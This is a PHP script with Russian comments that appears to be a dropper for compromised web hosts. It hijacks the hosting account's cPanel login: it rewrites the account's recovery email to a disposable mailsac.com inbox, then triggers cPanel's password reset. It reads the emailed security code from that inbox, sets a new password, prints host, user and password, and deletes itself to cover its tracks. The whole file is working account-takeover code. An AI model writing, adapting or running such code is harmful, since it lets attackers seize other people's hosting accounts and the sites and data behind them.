<?php
// Генерация случайной строки
function generateRandomString($length = 10)
{
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&*()';
	$charactersLength = strlen($characters);
	$randomString = '';
	for ($i = 0; $i < $length; $i++) $randomString .= $characters[ rand(0, $charactersLength - 1) ];
	return $randomString;
}

// Генерация имени
function getName($amount = 1)
{
	
	$n = array('Alex','Liam','Juan','Bob','Alice','Matt','Hopkins','Jim','Michael','Alison','Li','Aliesha','Aairah','Mahamed','Mohammad','Muhammet','Mohamad','Leona','Alexandra','Kelsi','Cecelia','Izzy','Chandi','Bailey','Pacha','Pacheco','Blanchard','Mata','Matta','David','Floyd','Ortiz','Mccarty','Greaves','Reeves','Henson','Harrison','Rick','Morty');
	$o = array();
	for($i = 0; $i < $amount; $i++) $o[] = $n[array_rand($n)];
	if($amount > 1) return $o;
	else return $o[0];
}

// Отправка запроса
function curlTo($url, $request, $cookiejar, $params, $timeout)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, ($request == 'POST' ? true : false));
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	if($params != '' && is_array($params)) curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	($cookiejar != null ? curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiejar) : null);
	($cookiejar != null ? curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiejar) : null);
	
	if(!curl_errno($ch))
	{
		$o = curl_exec($ch);
		curl_close($ch);
		return $o;
	}
	else
	{
		curl_close($ch);
		return false;
	}
}

function stop($msg)
{
	unlink(__file__);
	die('<result>'.$msg.'</result>');
}

// Проверка путей на наличие cpanel
$dirpath = explode('/', __DIR__);
$user = $dirpath[2];
$filepath = '/'.$dirpath[1].'/'.$user.'/.cpanel/contactinfo';
if(!file_exists($filepath))
{
	$user = $dirpath[3];
	$filepath = '/'.$dirpath[1].'/'.$dirpath[2].'/'.$user.'/.cpanel/contactinfo';
	if(!file_exists($filepath)) stop('re_error_cpanel_not_found');
}

// Генерация временного ящика @mailsac.com
$mail_name = getName(2);
$mail_name = implode('.', $mail_name);
$mail_name = strtolower($mail_name.rand(10,1337));
$email = $mail_name . '@mailsac.com';

$mte = curlTo('https://mailsac.com/inbox/'.$email, 'GET', '', '', 30);
if(strpos($mte, $email) == false) stop('re_error_temp_mail');

// Замена e-mail cpanel
if(is_readable($filepath) && is_writable($filepath))
{
	$contactinfo_text = @file_get_contents($filepath);
	$ciar = explode(PHP_EOL, $contactinfo_text);

	if(isset($ciar[1]) && preg_match('/\"email\"\: \'(.*?)\'/', $ciar[1], $old_email))
	{
		if(isset($old_email[1]))
		{
			if(empty($old_email[1])) $new_contactinfo = str_replace('"email": \'\'', '"email": \''.$email.'\'', $contactinfo_text);
			else $new_contactinfo = str_replace($old_email[1], $email, $contactinfo_text);
			if(file_put_contents($filepath, $new_contactinfo) === false) stop('re_error_write_email');
		}
		else stop('re_error_find_email');
	}
	else
	{
		$new_contactinfo = "---\n\"email\": '".$email."'";
		if(file_put_contents($filepath, $new_contactinfo) === false) stop('re_error_write_email');
	}
}
else stop('re_error_contactinfo_access');

// Определяем ссылку на cpanel
$hostname = $_SERVER['HTTP_HOST'];
if(isset($_SERVER['HTTPS'])) $scheme = $_SERVER['HTTPS'];
else $scheme = '';
if($scheme && $scheme != '' && $scheme != 'off') $host = 'https://'.$hostname.':2083';
else $host = 'http://'.$hostname.':2082';

// Отправляем запрос на сброс пароля
$test = curlTo($host.'/resetpass?start=1', 'GET', '', '', 30);
if(strpos($test, 'cPanel') == false) stop('re_error_reset_disable');
else
{	
	$cookiejar = tempnam(sys_get_temp_dir(),"cookie-" . time());
	$ou = curlTo($host.'/resetpass', 'POST', $cookiejar, array('user' => $user, 'login' => 'Reset+Password'), 30);
	if(strpos($ou, 'puzzle') !== false)
	{
		$ou = curlTo($host.'/resetpass', 'POST', $cookiejar, array('action' => 'puzzle', 'user' => $user, 'answer' => $email, 'debug' => '', 'puzzle-guess-input' => $email,'login' => 'Send Security Code'), 30);
		if(strpos($ou, 'info-security-code') !== false || strpos($ou, 'puzzle-guess-input') !== false)
		{
			// Поиск подтверждения на временной почте
			for($i=0; $i<=5; $i++)
			{
				sleep(5);
				$cnemail = curlTo('https://mailsac.com/inbox/'.$email, 'GET', '', '', 15);
				if(strpos($cnemail, $user) !== false) break;
				else $cnemail = '';
			}
			if($cnemail == '') stop('re_error_recovery_email');
			preg_match_all('#<\s*?p\b[^>]*>(.*?)</p\b[^>]*>#s', $cnemail, $cma);
			$valkey = '';
			for($i = 0; $i < count($cma[1]); $i++)
			{
				if(is_numeric($cma[1][$i])) $valkey = $cma[1][$i];
			}
			
			if(empty($valkey))
			{
				if(file_exists($cookiejar)) unlink($cookiejar);
				stop('re_error_valkey');
			}
			else
			{
				$ou = curlTo($host.'/resetpass', 'POST', $cookiejar, array('action' => 'seccode', 'user' => $user, 'debug' => '', 'confirm' => $valkey), 30);
				if(strpos($ou, 'login-status-message') !== false)
				{
					// Генерация нового пароля
					$dn = getName();
					$rs = generateRandomString(5);
					$newpass = $dn.$rs.'*';
					
					// Установка нового пароля
					$ou = curlTo($host.'/resetpass', 'POST', $cookiejar, array('action' => 'password', 'user' => $user, 'debug' => '', 'password' => $newpass, 'alpha' => 'both', 'nonalpha' => 'both', 'confirm' => $newpass), 30);
					if(strpos($ou, 'success-change-password') !== false) if(file_exists($cookiejar)) unlink($cookiejar);
					else 
					{
						if(file_exists($cookiejar)) unlink($cookiejar);
						stop('re_error_3_step');
					}
				}
				else
				{
					if(file_exists($cookiejar)) unlink($cookiejar);
					stop('re_error_2_step');
				}
			}
		}
		else
		{
			if(file_exists($cookiejar)) unlink($cookiejar);
			stop('re_error_sec_code');
		}
	}
	else
	{
		if(file_exists($cookiejar)) unlink($cookiejar);
		stop('re_error_reset_disable');
	}
}
stop($host.'|'.$user.'|'.$newpass);
?>